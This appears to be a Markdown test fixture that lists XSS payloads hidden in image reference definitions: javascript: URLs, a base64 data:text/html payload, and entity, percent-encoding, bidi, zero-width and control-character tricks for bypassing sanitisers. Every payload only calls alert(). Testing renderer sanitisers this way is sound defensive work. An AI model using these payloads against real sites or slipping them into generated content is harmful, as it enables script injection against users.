# Advanced Image Reference Manipulation and URL State Confusion

## Reference link with state confusion
![test][dangerous-ref]
![safe][legitimate-ref]

[dangerous-ref]: javascript:alert('ref-payload')
[legitimate-ref]: https://safe.com/image.jpg

## Reference overriding attacks
![test][ref1]
[ref1]: https://safe.com/image.jpg
[ref1]: javascript:alert('override') "Double definition"

## Case-insensitive reference exploitation  
![test][MIXEDCASE]
[mixedcase]: javascript:alert('case-insensitive')

## Reference with URL fragments breaking validation
![test][frag-ref]
[frag-ref]: https://safe.com#javascript:alert('fragment')

## Reference with malformed syntax parsing
![test] [spaced-ref-malformed]
[spaced-ref-malformed]:javascript:alert('no-space')

## References with markdown injection in title
![test][title-inject]
[title-inject]: https://safe.com/image.jpg "Safe title [**bold**](javascript:alert('nested'))"

## References with HTML entities in definition
![test][entity-ref]
[entity-ref]: &#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert('entities')

## Multiple reference definitions with parser confusion
![test][multi-def]

[multi-def]: https://safe.com/first.jpg
Normal content here
[multi-def]: javascript:alert('second') "Which definition wins?"

## Reference link URL construction bypass attempts
![test][construct-ref]
[construct-ref]: data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KCdyZWZkYXRhJyk+

## Reference with percent-encoded dangerous characters
![test][encoded-dangerous]
[encoded-dangerous]: %6A%61%76%61%73%63%72%69%70%74%3Aalert('encoded-ref')

## References breaking across line boundaries
![test][
multiline-ref
]
[multiline-ref]: javascript:alert('multiline')

## Reference injection through parentheses confusion  
![test](javascript:alert('inline'))
![test][paren-confuse]
[paren-confuse]: https://safe.com/image.jpg

## References with parser state reset attempts
![test][reset-ref]

---

[reset-ref]: javascript:alert('after-divider')

## Reference with protocol smuggling in definition
![test][protocol-ref]
[protocol-ref]: https://safe.com\x00javascript:alert('null-inject')

## Reference with Unicode directional override in URL
![test][bidi-ref]  
[bidi-ref]: https://safe.com/‮tpircsavaj:alert('rtl-override')

## Reference definitions with markdown escaping
![test][escaped-ref]
[escaped-ref]: https://safe.com/\)javascript:alert('escape-inject')

## Reference with nested bracket parsing confusion
![test][[nested-ref]]
[nested-ref]: javascript:alert('nested-brackets')

## Reference with zero-width characters
![test][​zwsp-ref​]
[​zwsp-ref​]: javascript:alert('zwsp-boundary')

## References exploiting parser lookahead
![test][lookahead-ref] and more content
[lookahead-ref]: javascript:alert('lookahead-exploit')

## Reference with malformed title containing injection
![test][malformed-title-ref]
[malformed-title-ref]: https://safe.com/image.jpg "title contains \" javascript:alert('quote-break')

## Reference URL with path traversal normalization bypass
![test][traversal-ref]
[traversal-ref]: https://safe.com/../../../javascript:alert('traversal')

## References with control character injection
![test][control-ref]
[control-ref]: https://safe.com/\x08\x0E\x0Fjavascript:alert('control')